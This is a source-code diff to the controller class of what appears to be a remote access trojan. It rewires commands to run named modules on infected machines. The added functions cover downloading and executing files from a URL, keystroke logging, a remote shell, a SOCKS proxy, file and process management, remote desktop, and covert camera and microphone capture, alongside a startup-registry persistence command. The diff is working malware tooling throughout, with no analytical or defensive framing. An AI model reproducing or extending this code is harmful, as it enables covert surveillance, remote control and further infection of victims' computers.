@@ -3,6 +3,8 @@
 #include "json\json.h"
 #include "utils.h"
 #include "dbg.h"
+#include "filedownloader_common.h"
+
 
 #define MAX_CHUNK_SIZE 0x10000
 
@@ -14,6 +16,7 @@ CEventHandler(pClient,KNEL)
 	m_hModuleFile            = INVALID_HANDLE_VALUE;
 	m_LastGetTime            = 0;
 	m_lpBuffer = new BYTE[MAX_CHUNK_SIZE];
+	m_bLogin = FALSE;
 }
 
 
@@ -41,7 +44,10 @@ void CKernelSrv::OnOpen()
 
 void CKernelSrv::OnClose()
 {
-	Notify(WM_KERNEL_LOGOUT, (WPARAM)this);
+	if (m_bLogin)
+		Notify(WM_KERNEL_LOGOUT, (WPARAM)this);
+
+	m_bLogin = FALSE;
 }
 
 void CKernelSrv::OnEvent(UINT32 e, BYTE *lpData, UINT32 Size)
@@ -88,45 +94,6 @@ void CKernelSrv::Restart()
 	Send(KNEL_RESTART, 0, 0);
 }
 
-void CKernelSrv::UploadModuleFromDisk(TCHAR* Path)
-{
-	Send(KNEL_UPLOAD_MODULE_FROMDISK, Path, sizeof(TCHAR) * (lstrlen(Path) + 1));
-}
-
-void CKernelSrv::UploadModuleFromUrl(TCHAR* Url)
-{
-	Send(KNEL_UPLOAD_MODULE_FORMURL, Url, sizeof(TCHAR) * (lstrlen(Url) + 1));
-}
-void CKernelSrv::BeginCmd()
-{
-	Send(KNEL_CMD, 0, 0);
-}
-
-void CKernelSrv::BeginChat()
-{
-	Send(KNEL_CHAT, 0, 0);
-}
-
-void CKernelSrv::BeginFileMgr()
-{
-	Send(KNEL_FILEMGR, 0, 0);
-}
-
-void CKernelSrv::BeginRemoteDesktop()
-{
-	Send(KNEL_DESKTOP, 0, 0);
-}
-
-void CKernelSrv::BeginCamera()
-{
-	Send(KNEL_CAMERA, 0, 0);
-}
-
-void CKernelSrv::BeginMicrophone()
-{
-	Send(KNEL_MICROPHONE, 0, 0);
-}
-
 
 void CKernelSrv::UtilsWriteStartupReg(){
 	Send(KNEL_UTILS_WRITE_REG, 0, 0);
@@ -147,33 +114,190 @@ void CKernelSrv::OnError(TCHAR * Error)
 	Notify(WM_KERNEL_ERROR, (WPARAM)Error,(LPARAM)this);
 }
 
-void CKernelSrv::BeginDownloadAndExec(TCHAR szUrl[])
-{
-	Send(KNEL_DOWNANDEXEC, szUrl, sizeof(TCHAR) * (1 + lstrlen(szUrl)));
-}
 
 void CKernelSrv::BeginExit()
 {
 	Send(KNEL_EXIT, 0, 0);
 }
 
+
+void CKernelSrv::BeginDownloadAndExec(TCHAR szUrl[])
+{
+	vec    bufs[3];
+	BYTE  *params = NULL;
+	UINT32 param_size = 0;
+	/*
+		flag
+		url
+		save path = NULL means download to temp path.
+	*/
+
+	param_size = serialize_kernel_params(
+		&params,
+		3,
+		type_value, FILEDOWNLOADER_FLAG_RUNAFTERDOWNLOAD,
+		type_pointer, szUrl, sizeof(TCHAR) * (1 + lstrlen(szUrl)),
+		type_pointer, 0, 0);
+
+	if (param_size == (~0))
+	{
+		dbg_log("serialize_kernel_params failed");
+		return;
+	}
+
+	bufs[0].lpData = TEXT("filedownloader");
+	bufs[0].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("filedownloader")));
+
+	bufs[1].lpData = TEXT("ModuleEntry");
+	bufs[1].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("ModuleEntry")));
+
+	bufs[2].lpData = params;
+	bufs[2].Size = param_size;
+
+	Send(KNEL_RUN_MODULE,bufs,3);
+
+	free(params);
+}
+
+
 void CKernelSrv::BeginKeyboardLog()
 {
-	Send(KNEL_KEYBD_LOG, 0, 0);
+	vec    bufs[2];
+
+	bufs[0].lpData = TEXT("kblog");
+	bufs[0].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("kblog")));
+
+	bufs[1].lpData = TEXT("ModuleEntry");
+	bufs[1].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("ModuleEntry")));
+
+	Send(KNEL_RUN_MODULE, bufs, 2);
 }
 
 void CKernelSrv::BeginProxy_Socks()
 {
-	Send(KNEL_PROXY_SOCKSPROXY, 0, 0);
+	vec    bufs[2];
+
+	bufs[0].lpData = TEXT("socksproxy");
+	bufs[0].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("socksproxy")));
+
+	bufs[1].lpData = TEXT("ModuleEntry");
+	bufs[1].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("ModuleEntry")));
+
+	Send(KNEL_RUN_MODULE, bufs, 2);
 }
 
 void CKernelSrv::BeginProcessManager()
 {
-	Send(KNEL_PROCESSMANAGER,0,0);
+	vec    bufs[2];
+
+	bufs[0].lpData = TEXT("processmgr");
+	bufs[0].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("processmgr")));
+
+	bufs[1].lpData = TEXT("ModuleEntry");
+	bufs[1].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("ModuleEntry")));
+
+	Send(KNEL_RUN_MODULE, bufs, 2);
 }
+
+
+void CKernelSrv::BeginCmd()
+{
+	vec    bufs[2];
+
+	bufs[0].lpData = TEXT("cmd");
+	bufs[0].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("cmd")));
+
+	bufs[1].lpData = TEXT("ModuleEntry");
+	bufs[1].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("ModuleEntry")));
+
+	Send(KNEL_RUN_MODULE, bufs, 2);
+}
+
+void CKernelSrv::BeginChat()
+{
+	vec    bufs[2];
+
+	bufs[0].lpData = TEXT("chat");
+	bufs[0].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("chat")));
+
+	bufs[1].lpData = TEXT("ModuleEntry");
+	bufs[1].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("ModuleEntry")));
+
+	Send(KNEL_RUN_MODULE, bufs, 2);
+}
+
+void CKernelSrv::BeginFileMgr()
+{
+	vec    bufs[2];
+
+	bufs[0].lpData = TEXT("filemgr");
+	bufs[0].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("filemgr")));
+
+	bufs[1].lpData = TEXT("ModuleEntry");
+	bufs[1].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("ModuleEntry")));
+
+	Send(KNEL_RUN_MODULE, bufs, 2);
+}
+
+void CKernelSrv::BeginRemoteDesktop_gdi()
+{
+	vec    bufs[2];
+
+	bufs[0].lpData = TEXT("rd");
+	bufs[0].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("rd")));
+
+	bufs[1].lpData = TEXT("ModuleEntry");
+	bufs[1].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("ModuleEntry")));
+
+	Send(KNEL_RUN_MODULE, bufs, 2);
+}
+
+void CKernelSrv::BeginRemoteDesktop_dxgi()
+{
+	vec    bufs[2];
+
+	bufs[0].lpData = TEXT("rd_dxgi");
+	bufs[0].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("rd_dxgi")));
+
+	bufs[1].lpData = TEXT("ModuleEntry");
+	bufs[1].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("ModuleEntry")));
+
+	Send(KNEL_RUN_MODULE, bufs, 2);
+}
+
+
+
+
+void CKernelSrv::BeginCamera()
+{
+	vec    bufs[2];
+
+	bufs[0].lpData = TEXT("camera");
+	bufs[0].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("camera")));
+
+	bufs[1].lpData = TEXT("ModuleEntry");
+	bufs[1].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("ModuleEntry")));
+
+	Send(KNEL_RUN_MODULE, bufs, 2);
+}
+
+void CKernelSrv::BeginMicrophone()
+{
+	vec    bufs[2];
+
+	bufs[0].lpData = TEXT("microphone");
+	bufs[0].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("microphone")));
+
+	bufs[1].lpData = TEXT("ModuleEntry");
+	bufs[1].Size = sizeof(TCHAR) * (1 + lstrlen(TEXT("ModuleEntry")));
+
+	Send(KNEL_RUN_MODULE, bufs, 2);
+}
+
 
 void CKernelSrv::OnLogin(LoginInfo *pLi)
 {
+	m_bLogin = TRUE;
 	Notify(WM_KERNEL_LOGIN, (WPARAM)this, (LPARAM)pLi);
 }
 
@@ -201,8 +325,6 @@ void CKernelSrv::OnGetModuleChunk(char * ChunkInfo){
 	TCHAR *		szModuleName = (TCHAR*)(ChunkInfo + sizeof(DWORD) * 3);
 	DWORD		dwFileSize   = 0;
 	vec         bufs[3] = { 0 };
-
-	dbg_log("OnGetModuleChunk\n");
 
 	if (lstrcmp(szModuleName, m_szCurrentModuleName))
 	{
@@ -303,8 +425,6 @@ void CKernelSrv::OnGetModuleChunk(char * ChunkInfo){
 		bufs[2].Size = SuccessBytes;
 		//send file chunk.
 		Send(KNEL_MODULE_CHUNK_DAT, bufs, 3);
-
-
 
 		//Notify window.
 		if ((dwOffset + SuccessBytes == dwFileSize) ||
